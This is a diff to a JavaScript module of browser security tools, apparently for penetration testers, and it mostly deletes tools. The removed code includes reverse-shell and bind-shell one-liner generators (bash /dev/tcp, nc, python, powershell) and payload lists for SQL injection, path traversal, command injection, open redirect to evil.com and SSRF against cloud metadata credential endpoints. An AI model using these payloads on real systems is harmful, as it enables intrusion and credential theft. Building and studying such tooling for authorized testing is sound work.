@@ -6,24 +6,10 @@
 const S = (v) => (v == null ? "" : String(v));
 
 // ---- small shared helpers (module scope) ----
-function jsonPretty(o) { return JSON.stringify(o, null, 2); }
-
 function b64urlBytes(u8) {
   let bin = "";
   for (let i = 0; i < u8.length; i++) bin += String.fromCharCode(u8[i]);
   return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
-}
-function b64urlDecodeBytes(s) {
-  let t = String(s).trim().replace(/-/g, "+").replace(/_/g, "/").replace(/\s+/g, "");
-  while (t.length % 4) t += "=";
-  const bin = atob(t);
-  const u = new Uint8Array(bin.length);
-  for (let i = 0; i < bin.length; i++) u[i] = bin.charCodeAt(i);
-  return u;
-}
-function splitJwt(tok) {
-  const p = String(tok || "").trim().split(".");
-  return p.length >= 2 ? p : null;
 }
 
 // binary-safe base64 / base32 straight from bytes (H.fromBytes is UTF-8 lossy for binary)
@@ -218,25 +204,6 @@ export const TOOLS = [
       return out.join("\n");
     } },
 
-  // 6
-  { id: "sx-jwt-decode", name: "JWT Decoder", cat: "appsec", desc: "Decode a JWT's header and payload (no signature verification); shows alg and exp.", tags: ["jwt", "token", "decode"],
-    inputs: [{ k: "token", label: "JWT", type: "textarea", rows: 4, placeholder: "eyJhbGci..." }],
-    run(v, H) {
-      if (!v.token) return "";
-      const parts = splitJwt(v.token);
-      if (!parts) return { error: "Not a JWT (expected header.payload.signature)." };
-      try {
-        const header = JSON.parse(H.fromBytes(b64urlDecodeBytes(parts[0])));
-        const payload = JSON.parse(H.fromBytes(b64urlDecodeBytes(parts[1])));
-        let expNote = "";
-        if (payload.exp) {
-          const d = new Date(payload.exp * 1000);
-          expNote = `\n\nexp: ${payload.exp} (${d.toISOString()}) — ${payload.exp * 1000 < Date.now() ? "EXPIRED" : "valid"}`;
-        }
-        return `alg: ${header.alg}\n\nHEADER:\n${jsonPretty(header)}\n\nPAYLOAD:\n${jsonPretty(payload)}${expNote}`;
-      } catch (e) { return { error: "Malformed base64url or JSON." }; }
-    } },
-
   // 7
   { id: "sx-jwt-none", name: "JWT alg:none Forge", cat: "appsec", desc: "Re-encode header+payload as an unsigned alg:none token to test missing signature verification (authorized testing).", tags: ["jwt", "alg none", "bypass"],
     inputs: [
@@ -272,24 +239,6 @@ export const TOOLS = [
       return `${signing}.${sig}`;
     } },
 
-  // 9
-  { id: "sx-jwt-expiry", name: "JWT Expiry Checker", cat: "appsec", desc: "Check a JWT's exp/nbf/iat claims against the current time.", tags: ["jwt", "exp", "expiry"],
-    inputs: [{ k: "token", label: "JWT", type: "textarea", rows: 3 }],
-    run(v, H) {
-      if (!v.token) return "";
-      const parts = splitJwt(v.token);
-      if (!parts) return { error: "Not a JWT." };
-      let p;
-      try { p = JSON.parse(H.fromBytes(b64urlDecodeBytes(parts[1]))); } catch (e) { return { error: "Cannot decode payload." }; }
-      const now = Math.floor(Date.now() / 1000);
-      const lines = [`Now: ${now} (${new Date(now * 1000).toISOString()})`];
-      const show = (k) => { if (p[k] != null) lines.push(`${k}: ${p[k]} (${new Date(p[k] * 1000).toISOString()})`); };
-      show("iat"); show("nbf"); show("exp");
-      if (p.exp != null) lines.push(`\nStatus: ${p.exp < now ? `EXPIRED ${humanTime(now - p.exp)} ago` : `valid for ${humanTime(p.exp - now)}`}`);
-      else lines.push("\nNo exp claim present.");
-      return lines.join("\n");
-    } },
-
   // 10
   { id: "sx-htpasswd", name: "htpasswd Line", cat: "appsec", desc: "Build an Apache htpasswd entry using SHA-1 ({SHA}) or a plaintext variant.", tags: ["htpasswd", "apache", "sha1", "auth"],
     inputs: [
@@ -315,59 +264,6 @@ export const TOOLS = [
       const baseHps = 1e5; // ~cost-4 baseline on a modern core
       const hps = baseHps / Math.pow(2, cost - 4);
       return `Cost factor: ${cost}\nKey-expansion rounds: 2^${cost} = ${iters.toLocaleString()}\nApprox hashes/sec (single core): ~${hps < 1 ? hps.toExponential(2) : Math.round(hps)}\nTime per hash: ~${(1 / hps).toFixed(4)} s\n\nApache MD5 apr1 uses 1000 iterations and is far weaker — prefer bcrypt (cost >= 12) or argon2id.`;
-    } },
-
-  // 12
-  { id: "sx-cvss31", name: "CVSS 3.1 Base Score", cat: "appsec", desc: "Compute a CVSS 3.1 base score and severity from the base metrics.", tags: ["cvss", "score", "vulnerability", "severity"],
-    inputs: [
-      { k: "av", label: "Attack Vector", type: "select", opts: [["N", "Network"], ["A", "Adjacent"], ["L", "Local"], ["P", "Physical"]], value: "N" },
-      { k: "ac", label: "Attack Complexity", type: "select", opts: [["L", "Low"], ["H", "High"]], value: "L" },
-      { k: "pr", label: "Privileges Required", type: "select", opts: [["N", "None"], ["L", "Low"], ["H", "High"]], value: "N" },
-      { k: "ui", label: "User Interaction", type: "select", opts: [["N", "None"], ["R", "Required"]], value: "N" },
-      { k: "sc", label: "Scope", type: "select", opts: [["U", "Unchanged"], ["C", "Changed"]], value: "U" },
-      { k: "c", label: "Confidentiality", type: "select", opts: [["N", "None"], ["L", "Low"], ["H", "High"]], value: "H" },
-      { k: "i", label: "Integrity", type: "select", opts: [["N", "None"], ["L", "Low"], ["H", "High"]], value: "H" },
-      { k: "a", label: "Availability", type: "select", opts: [["N", "None"], ["L", "Low"], ["H", "High"]], value: "H" },
-    ],
-    run(v) {
-      const AV = { N: 0.85, A: 0.62, L: 0.55, P: 0.2 }[v.av];
-      const AC = { L: 0.77, H: 0.44 }[v.ac];
-      const changed = v.sc === "C";
-      const PR = (changed ? { N: 0.85, L: 0.68, H: 0.5 } : { N: 0.85, L: 0.62, H: 0.27 })[v.pr];
-      const UI = { N: 0.85, R: 0.62 }[v.ui];
-      const CIA = { N: 0, L: 0.22, H: 0.56 };
-      const C = CIA[v.c], I = CIA[v.i], A = CIA[v.a];
-      const iscBase = 1 - (1 - C) * (1 - I) * (1 - A);
-      const impact = changed ? 7.52 * (iscBase - 0.029) - 3.25 * Math.pow(iscBase - 0.02, 15) : 6.42 * iscBase;
-      const expl = 8.22 * AV * AC * PR * UI;
-      const roundup = (x) => Math.ceil(x * 10) / 10;
-      let base;
-      if (impact <= 0) base = 0;
-      else base = roundup(Math.min(changed ? 1.08 * (impact + expl) : impact + expl, 10));
-      let sev = "None";
-      if (base >= 9) sev = "Critical"; else if (base >= 7) sev = "High"; else if (base >= 4) sev = "Medium"; else if (base >= 0.1) sev = "Low";
-      const vec = `CVSS:3.1/AV:${v.av}/AC:${v.ac}/PR:${v.pr}/UI:${v.ui}/S:${v.sc}/C:${v.c}/I:${v.i}/A:${v.a}`;
-      return `Base score: ${base.toFixed(1)}\nSeverity: ${sev}\nImpact sub-score: ${(Math.round(impact * 10) / 10).toFixed(1)}\nExploitability sub-score: ${(Math.round(expl * 10) / 10).toFixed(1)}\n\nVector: ${vec}`;
-    } },
-
-  // 13
-  { id: "sx-cidr-range", name: "CIDR to IP Range", cat: "appsec", desc: "Expand an IPv4 CIDR to network, broadcast, host range and host count.", tags: ["cidr", "subnet", "network", "range"],
-    inputs: [{ k: "cidr", label: "CIDR", type: "text", placeholder: "192.168.1.0/24" }],
-    run(v) {
-      const m = S(v.cidr).trim().match(/^(.+)\/(\d{1,2})$/);
-      if (!m) return { error: "Enter as IP/prefix, e.g. 10.0.0.0/24." };
-      const ip = ipToInt(m[1]);
-      const pfx = +m[2];
-      if (ip == null) return { error: "Invalid IPv4 address." };
-      if (pfx > 32) return { error: "Prefix must be 0-32." };
-      const mask = pfx === 0 ? 0 : (0xffffffff << (32 - pfx)) >>> 0;
-      const net = (ip & mask) >>> 0;
-      const bcast = (net | (~mask >>> 0)) >>> 0;
-      const total = Math.pow(2, 32 - pfx);
-      const usable = total > 2 ? total - 2 : total;
-      const first = total > 2 ? net + 1 : net;
-      const last = total > 2 ? bcast - 1 : bcast;
-      return `Network:   ${intToIp(net)}/${pfx}\nNetmask:   ${intToIp(mask)}\nBroadcast: ${intToIp(bcast)}\nFirst host: ${intToIp(first)}\nLast host:  ${intToIp(last)}\nTotal addresses: ${total.toLocaleString()}\nUsable hosts:    ${usable.toLocaleString()}`;
     } },
 
   // 14
@@ -453,23 +349,6 @@ export const TOOLS = [
       return `Netmask:  ${intToIp(mask)}\nWildcard: ${intToIp(wild)}`;
     } },
 
-  // 19
-  { id: "sx-is-private-ip", name: "Private IP Checker", cat: "appsec", desc: "Classify an IPv4 address as private, loopback, link-local, CGNAT, reserved or public.", tags: ["private", "rfc1918", "ip", "ssrf"],
-    inputs: [{ k: "ip", label: "IPv4", type: "text", placeholder: "10.1.2.3" }],
-    run(v) {
-      if (!v.ip) return "";
-      const n = ipToInt(v.ip);
-      if (n == null) return { error: "Invalid IPv4 address." };
-      const inR = (cidr) => { const [b, p] = cidr.split("/"); const mask = (0xffffffff << (32 - +p)) >>> 0; return ((n & mask) >>> 0) === ((ipToInt(b) & mask) >>> 0); };
-      const checks = [
-        ["10.0.0.0/8", "Private (RFC 1918)"], ["172.16.0.0/12", "Private (RFC 1918)"], ["192.168.0.0/16", "Private (RFC 1918)"],
-        ["127.0.0.0/8", "Loopback"], ["169.254.0.0/16", "Link-local"], ["100.64.0.0/10", "CGNAT (RFC 6598)"],
-        ["0.0.0.0/8", "This-network / reserved"], ["192.0.2.0/24", "Documentation (TEST-NET-1)"], ["224.0.0.0/4", "Multicast"], ["240.0.0.0/4", "Reserved"],
-      ];
-      for (const [c, label] of checks) if (inR(c)) return `${v.ip}: ${label} (matched ${c})`;
-      return `${v.ip}: Public / globally-routable`;
-    } },
-
   // 20
   { id: "sx-ipv6", name: "IPv6 Expand / Compress", cat: "appsec", desc: "Expand an IPv6 address to full form or compress it to shorthand.", tags: ["ipv6", "expand", "compress"],
     inputs: [
@@ -507,26 +386,6 @@ export const TOOLS = [
       return g.join(":");
     } },
 
-  // 21
-  { id: "sx-hash-id", name: "Hash Type Identifier", cat: "appsec", desc: "Guess the likely hash algorithm from its length and character set.", tags: ["hash", "identify", "crack"],
-    inputs: [{ k: "h", label: "Hash", type: "textarea", rows: 2, placeholder: "5f4dcc3b5aa765d61d8327deb882cf99" }],
-    run(v) {
-      const h = S(v.h).trim();
-      if (!h) return "";
-      if (/^\$2[aby]\$\d\d\$/.test(h)) return "bcrypt ($2)";
-      if (/^\$1\$/.test(h)) return "md5crypt ($1$)";
-      if (/^\$5\$/.test(h)) return "sha256crypt ($5$)";
-      if (/^\$6\$/.test(h)) return "sha512crypt ($6$)";
-      if (/^\$argon2(id|i|d)\$/.test(h)) return "argon2";
-      if (/^\{SHA\}/.test(h)) return "Apache {SHA} (base64 SHA-1)";
-      if (/^[0-9a-fA-F]+$/.test(h)) {
-        const len = h.length;
-        const map = { 32: "MD5 / MD4 / NTLM / MD2", 40: "SHA-1 / RIPEMD-160", 56: "SHA-224 / SHA3-224", 64: "SHA-256 / SHA3-256 / BLAKE2s", 96: "SHA-384 / SHA3-384", 128: "SHA-512 / SHA3-512 / BLAKE2b", 16: "MySQL323 / CRC-64", 8: "CRC-32 / Adler-32" };
-        return map[len] ? `Length ${len} hex -> likely ${map[len]}` : `Length ${len} hex -> unknown hex hash`;
-      }
-      return "Unrecognized format (not hex or a known prefixed scheme).";
-    } },
-
   // 22
   { id: "sx-hash-string", name: "Hash a String", cat: "appsec", desc: "Hash text with MD5, SHA-1, SHA-256 or SHA-512.", tags: ["hash", "md5", "sha256", "digest"],
     inputs: [
@@ -553,19 +412,6 @@ export const TOOLS = [
     async run(v, H) {
       if (!v.key || !v.msg) return "";
       return await H.hmac(v.algo, v.key, v.msg);
-    } },
-
-  // 24
-  { id: "sx-kdf-note", name: "Password KDF Note Formatter", cat: "appsec", desc: "Emit recommended argon2id / bcrypt / scrypt parameters as a config-ready note.", tags: ["argon2", "bcrypt", "scrypt", "kdf"],
-    inputs: [{ k: "kdf", label: "KDF", type: "select", opts: ["argon2id", "bcrypt", "scrypt", "PBKDF2"], value: "argon2id" }],
-    run(v) {
-      const notes = {
-        argon2id: "argon2id (OWASP 2024):\n  memory = 19 MiB (m=19456)\n  iterations (t) = 2\n  parallelism (p) = 1\n  salt >= 16 bytes, output 32 bytes",
-        bcrypt: "bcrypt:\n  cost (work factor) >= 12\n  input password <= 72 bytes (pre-hash with SHA-256+base64 if longer)\n  built-in 16-byte salt",
-        scrypt: "scrypt (RFC 7914):\n  N = 2^17 (131072)\n  r = 8\n  p = 1\n  salt >= 16 bytes, output 32 bytes",
-        PBKDF2: "PBKDF2-HMAC-SHA256:\n  iterations >= 600000 (OWASP 2024)\n  salt >= 16 bytes, output 32 bytes\n  (prefer argon2id/scrypt where available)",
-      };
-      return notes[v.kdf] || "";
     } },
 
   // 25
@@ -680,21 +526,6 @@ export const TOOLS = [
       return out.join("\n");
     } },
 
-  // 30
-  { id: "sx-sqli-cheatsheet", name: "SQL Injection Cheatsheet", cat: "appsec", desc: "Common SQLi payloads by category for authorized testing / CTFs.", tags: ["sqli", "sql injection", "payload", "cheatsheet"],
-    inputs: [{ k: "cat", label: "Category", type: "select", opts: ["Auth bypass", "Union-based", "Boolean blind", "Time-based", "Error-based", "Stacked / comments"], value: "Auth bypass" }],
-    run(v) {
-      const p = {
-        "Auth bypass": ["' OR '1'='1", "' OR '1'='1' -- ", "admin' -- ", "admin' #", "') OR ('1'='1", "\" OR \"\"=\""],
-        "Union-based": ["' UNION SELECT NULL-- ", "' UNION SELECT NULL,NULL-- ", "' UNION SELECT username,password FROM users-- ", "' ORDER BY 1-- ", "' UNION SELECT @@version-- "],
-        "Boolean blind": ["' AND 1=1-- ", "' AND 1=2-- ", "' AND SUBSTRING(username,1,1)='a'-- ", "' AND (SELECT COUNT(*) FROM users)>0-- "],
-        "Time-based": ["' AND SLEEP(5)-- ", "'; WAITFOR DELAY '0:0:5'-- ", "' AND (SELECT pg_sleep(5))-- ", "' OR IF(1=1,SLEEP(5),0)-- "],
-        "Error-based": ["' AND extractvalue(1,concat(0x7e,version()))-- ", "' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- ", "' AND (SELECT 1 FROM(SELECT COUNT(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- "],
-        "Stacked / comments": ["'; DROP TABLE test-- ", "-- comment", "# comment (MySQL)", "/* comment */", "1;SELECT 1"],
-      };
-      return (p[v.cat] || []).join("\n") + "\n\n(Authorized testing only.)";
-    } },
-
   // 31
   { id: "sx-xss-cheatsheet", name: "XSS Payload Cheatsheet", cat: "appsec", desc: "Context-aware XSS payloads (HTML, attribute, JS, URL) for authorized testing.", tags: ["xss", "payload", "cheatsheet", "context"],
     inputs: [{ k: "ctx", label: "Injection context", type: "select", opts: ["HTML body", "HTML attribute", "JavaScript string", "URL / href"], value: "HTML body" }],
@@ -708,102 +539,12 @@ export const TOOLS = [
       return (p[v.ctx] || []).join("\n") + "\n\n(Authorized testing only.)";
     } },
 
-  // 32
-  { id: "sx-lfi-list", name: "LFI / Path Traversal List", cat: "appsec", desc: "Local file inclusion and directory-traversal payloads for authorized testing.", tags: ["lfi", "traversal", "payload", "path"],
-    inputs: [{ k: "target", label: "Target file", type: "select", opts: [["/etc/passwd", "/etc/passwd (Linux)"], ["boot.ini", "Windows boot.ini"], ["custom", "Generic traversal"]], value: "/etc/passwd" }],
-    run(v) {
-      const t = v.target === "boot.ini" ? "windows/win.ini" : v.target === "custom" ? "TARGET" : "etc/passwd";
-      const base = v.target === "boot.ini" ? "C:\\" : "/";
-      const list = [
-        `../../../../../../${t}`,
-        `..%2f..%2f..%2f..%2f${t}`,
-        `..%252f..%252f${t}`,
-        `....//....//....//${t}`,
-        `%2e%2e%2f%2e%2e%2f${t}`,
-        `/var/www/../../${t}`,
-        `php://filter/convert.base64-encode/resource=index.php`,
-        `${base}${t}%00`,
-        `..\\..\\..\\..\\windows\\win.ini`,
-      ];
-      return list.join("\n") + "\n\n(Authorized testing only.)";
-    } },
-
-  // 33
-  { id: "sx-cmdi-list", name: "Command Injection List", cat: "appsec", desc: "OS command-injection separators and payloads for authorized testing.", tags: ["command injection", "rce", "payload"],
-    inputs: [{ k: "os", label: "OS", type: "select", opts: ["Unix", "Windows"], value: "Unix" }],
-    run(v) {
-      const unix = ["; id", "| id", "|| id", "&& id", "`id`", "$(id)", "; cat /etc/passwd", "%0a id", "\n id", "; sleep 5"];
-      const win = ["& whoami", "| whoami", "&& whoami", "|| whoami", "; whoami", "& type C:\\windows\\win.ini", "| ping -n 5 127.0.0.1"];
-      return (v.os === "Windows" ? win : unix).join("\n") + "\n\n(Authorized testing only.)";
-    } },
-
-  // 34
-  { id: "sx-revshell", name: "Reverse Shell Generator", cat: "appsec", desc: "Build a reverse-shell one-liner for a listener you control (authorized testing).", tags: ["reverse shell", "payload", "pentest"],
-    inputs: [
-      { k: "lhost", label: "LHOST (your listener)", type: "text", placeholder: "10.10.14.5" },
-      { k: "lport", label: "LPORT", type: "text", placeholder: "4444" },
-      { k: "shell", label: "Type", type: "select", opts: ["bash", "python", "nc", "php", "powershell"], value: "bash" },
-    ],
-    run(v, H) {
-      const host = S(v.lhost).trim();
-      const port = H.clampInt(v.lport, 1, 65535, 0);
-      if (!host || !port) return { error: "Enter LHOST and a valid LPORT (1-65535)." };
-      const t = {
-        bash: `bash -i >& /dev/tcp/${host}/${port} 0>&1`,
-        python: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${host}",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'`,
-        nc: `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`,
-        php: `php -r '$s=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
-        powershell: `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${host}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}"`,
-      };
-      return t[v.shell] + `\n\nListener: nc -lvnp ${port}\n(Authorized testing only.)`;
-    } },
-
-  // 35
-  { id: "sx-bindshell", name: "Bind Shell Generator", cat: "appsec", desc: "Build a bind-shell one-liner that listens on the target (authorized testing).", tags: ["bind shell", "payload", "pentest"],
-    inputs: [
-      { k: "lport", label: "Listen port", type: "text", placeholder: "4444" },
-      { k: "shell", label: "Type", type: "select", opts: ["nc", "python", "bash"], value: "nc" },
-    ],
-    run(v, H) {
-      const port = H.clampInt(v.lport, 1, 65535, 0);
-      if (!port) return { error: "Enter a valid port (1-65535)." };
-      const t = {
-        nc: `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp ${port} >/tmp/f`,
-        python: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",${port}));s.listen(1);c,_=s.accept();[os.dup2(c.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'`,
-        bash: `while true; do nc -lvnp ${port} -e /bin/bash; done`,
-      };
-      return t[v.shell] + `\n\nConnect with: nc <target> ${port}\n(Authorized testing only.)`;
-    } },
-
-  // 36
-  { id: "sx-url-encode", name: "URL-encode Payload", cat: "appsec", desc: "Percent-encode a payload; option to encode every character.", tags: ["url", "encode", "percent"],
-    inputs: [
-      { k: "text", label: "Payload", type: "textarea", rows: 3 },
-      { k: "all", label: "Encode ALL characters", type: "checkbox", value: false },
-    ],
-    run(v) {
-      if (!v.text) return "";
-      if (v.all) return Array.from(S(v.text)).map((c) => { const cp = c.codePointAt(0); if (cp < 128) return "%" + cp.toString(16).toUpperCase().padStart(2, "0"); return encodeURIComponent(c); }).join("");
-      return encodeURIComponent(v.text);
-    } },
-
   // 37
   { id: "sx-double-url-encode", name: "Double URL-encode", cat: "appsec", desc: "URL-encode a payload twice (WAF/filter bypass testing).", tags: ["url", "double encode", "bypass"],
     inputs: [{ k: "text", label: "Payload", type: "textarea", rows: 3 }],
     run(v) {
       if (!v.text) return "";
       return encodeURIComponent(encodeURIComponent(v.text));
-    } },
-
-  // 38
-  { id: "sx-b64-payload", name: "Base64 a Payload", cat: "appsec", desc: "Base64-encode a payload, standard or URL-safe.", tags: ["base64", "encode", "payload"],
-    inputs: [
-      { k: "text", label: "Payload", type: "textarea", rows: 3 },
-      { k: "url", label: "URL-safe", type: "checkbox", value: false },
-    ],
-    run(v, H) {
-      if (!v.text) return "";
-      return H.b64encode(v.text, { url: !!v.url });
     } },
 
   // 39
@@ -981,83 +722,16 @@ export const TOOLS = [
     } },
 
   // 49
-  { id: "sx-nonce", name: "Nonce Generator", cat: "appsec", desc: "Generate a cryptographic nonce (CSP nonce, IV or challenge) in several encodings.", tags: ["nonce", "csp", "iv", "random"],
+  { id: "sx-nonce", name: "Nonce / Salt / Token Generator", cat: "appsec", desc: "Generate cryptographically random bytes for a nonce, salt, CSRF token or API secret, in hex, base64 or base64url.", tags: ["nonce", "csp", "iv", "random", "salt", "csrf", "token", "secret"],
     inputs: [
-      { k: "bytes", label: "Bytes", type: "range", min: 8, max: 32, step: 1, value: 16 },
+      { k: "bytes", label: "Bytes", type: "range", min: 4, max: 128, step: 1, value: 16 },
       { k: "fmt", label: "Format", type: "select", opts: [["b64", "base64"], ["hex", "hex"], ["b64url", "base64url"]], value: "b64" },
     ],
     run(v, H) {
-      const n = H.clampInt(v.bytes, 8, 32, 16);
+      const n = H.clampInt(v.bytes, 4, 128, 16);
       const rnd = H.randBytes(n);
       if (v.fmt === "hex") return H.toHex(rnd);
       return b64FromBytes(rnd, v.fmt === "b64url");
-    } },
-
-  // 50
-  { id: "sx-csrf-token", name: "CSRF Token Generator", cat: "appsec", desc: "Generate a high-entropy anti-CSRF token (URL-safe base64).", tags: ["csrf", "token", "random", "session"],
-    inputs: [{ k: "bytes", label: "Entropy bytes", type: "range", min: 16, max: 64, step: 1, value: 32 }],
-    run(v, H) {
-      const n = H.clampInt(v.bytes, 16, 64, 32);
-      return b64FromBytes(H.randBytes(n), true);
-    } },
-
-  // 51
-  { id: "sx-salt", name: "Salt Generator", cat: "appsec", desc: "Generate a random cryptographic salt in hex, base64 or Base64 crypt form.", tags: ["salt", "kdf", "random", "hash"],
-    inputs: [
-      { k: "bytes", label: "Bytes", type: "range", min: 8, max: 32, step: 1, value: 16 },
-      { k: "fmt", label: "Format", type: "select", opts: [["hex", "hex"], ["b64", "base64"], ["b64url", "base64url"]], value: "hex" },
-    ],
-    run(v, H) {
-      const n = H.clampInt(v.bytes, 8, 32, 16);
-      const rnd = H.randBytes(n);
-      if (v.fmt === "hex") return H.toHex(rnd);
-      return b64FromBytes(rnd, v.fmt === "b64url");
-    } },
-
-  // 52
-  { id: "sx-password-policy", name: "Password Policy Checker", cat: "appsec", desc: "Check whether a password meets length and character-class policy rules.", tags: ["policy", "password", "compliance", "check"],
-    inputs: [
-      { k: "pw", label: "Password", type: "text", inputType: "password" },
-      { k: "min", label: "Minimum length", type: "range", min: 6, max: 32, step: 1, value: 12 },
-    ],
-    run(v, H) {
-      const pw = S(v.pw);
-      if (!pw) return "";
-      const min = H.clampInt(v.min, 6, 32, 12);
-      const rules = [
-        [`Length >= ${min}`, pw.length >= min],
-        ["Has lowercase", /[a-z]/.test(pw)],
-        ["Has uppercase", /[A-Z]/.test(pw)],
-        ["Has digit", /[0-9]/.test(pw)],
-        ["Has symbol", /[^A-Za-z0-9]/.test(pw)],
-        ["No spaces at ends", pw === pw.trim()],
-      ];
-      const passed = rules.filter((r) => r[1]).length;
-      const body = rules.map((r) => `  [${r[1] ? "x" : " "}] ${r[0]}`).join("\n");
-      return `${passed}/${rules.length} rules met — ${passed === rules.length ? "PASS" : "FAIL"}\n${body}`;
-    } },
-
-  // 53
-  { id: "sx-leetspeak", name: "Leetspeak Mutator", cat: "appsec", desc: "Expand a base word into leetspeak variants for authorized password cracking wordlists.", tags: ["leet", "wordlist", "mutate", "crack"],
-    inputs: [
-      { k: "word", label: "Base word", type: "text", placeholder: "password" },
-      { k: "limit", label: "Max variants", type: "range", min: 1, max: 200, step: 1, value: 32 },
-    ],
-    run(v, H) {
-      const word = S(v.word).trim();
-      if (!word) return "";
-      if (word.length > 12) return { error: "Keep the base word <= 12 chars to bound the output." };
-      const map = { a: ["a", "@", "4"], e: ["e", "3"], i: ["i", "1", "!"], o: ["o", "0"], s: ["s", "$", "5"], t: ["t", "7"], l: ["l", "1"], g: ["g", "9"], b: ["b", "8"] };
-      const limit = H.clampInt(v.limit, 1, 200, 32);
-      let variants = [""];
-      for (const ch of word.toLowerCase()) {
-        const opts = map[ch] || [ch];
-        const next = [];
-        for (const pre of variants) for (const o of opts) { if (next.length < limit * 4) next.push(pre + o); }
-        variants = next;
-        if (variants.length > limit * 4) variants = variants.slice(0, limit * 4);
-      }
-      return Array.from(new Set(variants)).slice(0, limit).join("\n");
     } },
 
   // 54
@@ -1120,12 +794,16 @@ export const TOOLS = [
       { k: "user", label: "Username", type: "text", placeholder: "admin" },
       { k: "pass", label: "Password", type: "text", inputType: "password" },
       { k: "mode", label: "Direction", type: "select", opts: ["Encode user:pass", "Decode base64"], value: "Encode user:pass" },
-      { k: "blob", label: "Base64 (for decode)", type: "text", placeholder: "YWRtaW46cGFzcw==" },
+      { k: "blob", label: "Base64 or Authorization header (for decode)", type: "text", placeholder: "YWRtaW46cGFzcw==" },
     ],
     run(v, H) {
       if (v.mode === "Decode base64") {
-        if (!v.blob) return "";
-        try { return H.b64decode(v.blob); } catch (e) { return { error: "Invalid base64." }; }
+        const blob = S(v.blob).trim().replace(/^Authorization:\s*/i, "").replace(/^Basic\s+/i, "");
+        if (!blob) return "";
+        let dec;
+        try { dec = H.b64decode(blob); } catch (e) { return { error: "Invalid base64." }; }
+        const i = dec.indexOf(":");
+        return i < 0 ? `${dec}\n\nusername: ${dec}\npassword: (none)` : `${dec}\n\nusername: ${dec.slice(0, i)}\npassword: ${dec.slice(i + 1)}`;
       }
       if (!v.user && !v.pass) return "";
       if (S(v.user).includes(":")) return { error: "Username cannot contain ':'." };
@@ -1163,109 +841,6 @@ export const TOOLS = [
       return `Authorization: Basic ${token}`;
     } },
 
-  // 60
-  { id: "sx-cookie-flags", name: "Set-Cookie Flags Checker", cat: "appsec", desc: "Analyze a Set-Cookie header for Secure, HttpOnly and SameSite hardening.", tags: ["cookie", "set-cookie", "samesite", "httponly"],
-    inputs: [{ k: "c", label: "Set-Cookie value", type: "textarea", rows: 3, placeholder: "session=abc; Path=/; HttpOnly; Secure; SameSite=Lax" }],
-    run(v) {
-      let s = S(v.c).trim();
-      if (!s) return "";
-      s = s.replace(/^set-cookie:\s*/i, "");
-      const attrs = s.split(";").map((x) => x.trim());
-      const nameVal = attrs[0] || "";
-      const has = (re) => attrs.some((a) => re.test(a));
-      const secure = has(/^secure$/i);
-      const httpOnly = has(/^httponly$/i);
-      const ssM = attrs.find((a) => /^samesite/i.test(a));
-      const sameSite = ssM ? ssM.split("=")[1] : null;
-      const out = [`Cookie: ${nameVal.split("=")[0]}`];
-      out.push(`Secure: ${secure ? "yes" : "MISSING"}`);
-      out.push(`HttpOnly: ${httpOnly ? "yes" : "MISSING"}`);
-      out.push(`SameSite: ${sameSite || "MISSING (defaults to Lax in modern browsers)"}`);
-      const warn = [];
-      if (!secure) warn.push("Add Secure so the cookie is only sent over HTTPS.");
-      if (!httpOnly) warn.push("Add HttpOnly to block JS access (XSS theft).");
-      if (!sameSite) warn.push("Set SameSite (Lax/Strict) for CSRF defense.");
-      else if (/none/i.test(sameSite) && !secure) warn.push("SameSite=None requires Secure.");
-      if (warn.length) out.push("\nWarnings:\n  - " + warn.join("\n  - "));
-      return out.join("\n");
-    } },
-
-  // 61
-  { id: "sx-open-redirect", name: "Open-redirect Payload List", cat: "appsec", desc: "Redirect-parameter bypass payloads for authorized open-redirect testing.", tags: ["open redirect", "payload", "bypass"],
-    inputs: [{ k: "host", label: "Attacker host", type: "text", placeholder: "evil.com" }],
-    run(v) {
-      const h = S(v.host).trim() || "evil.com";
-      return [
-        `https://${h}`,
-        `//${h}`,
-        `/\\/${h}`,
-        `https:/${h}`,
-        `https://trusted.com@${h}`,
-        `https://trusted.com.${h}`,
-        `//${h}/%2f..`,
-        `/%09/${h}`,
-        `https://${h}%2f%2e%2e`,
-        `javascript:window.location='https://${h}'`,
-      ].join("\n") + "\n\n(Authorized testing only.)";
-    } },
-
-  // 62
-  { id: "sx-ssrf-list", name: "SSRF Payload Cheatsheet", cat: "appsec", desc: "SSRF target/bypass payloads including cloud metadata endpoints, for authorized testing.", tags: ["ssrf", "payload", "metadata", "bypass"],
-    inputs: [{ k: "cat", label: "Category", type: "select", opts: ["Localhost bypass", "Cloud metadata", "Protocol smuggling"], value: "Localhost bypass" }],
-    run(v) {
-      const data = {
-        "Localhost bypass": ["http://127.0.0.1", "http://localhost", "http://0.0.0.0", "http://127.1", "http://0177.0.0.1", "http://2130706433", "http://[::1]", "http://127.0.0.1.nip.io"],
-        "Cloud metadata": ["http://169.254.169.254/latest/meta-data/ (AWS)", "http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS)", "http://metadata.google.internal/computeMetadata/v1/ (GCP, needs Metadata-Flavor: Google)", "http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Azure)"],
-        "Protocol smuggling": ["file:///etc/passwd", "gopher://127.0.0.1:6379/_", "dict://127.0.0.1:11211/", "ftp://127.0.0.1/", "http://127.0.0.1:22"],
-      };
-      return (data[v.cat] || []).join("\n") + "\n\n(Authorized testing only.)";
-    } },
-
-  // 63
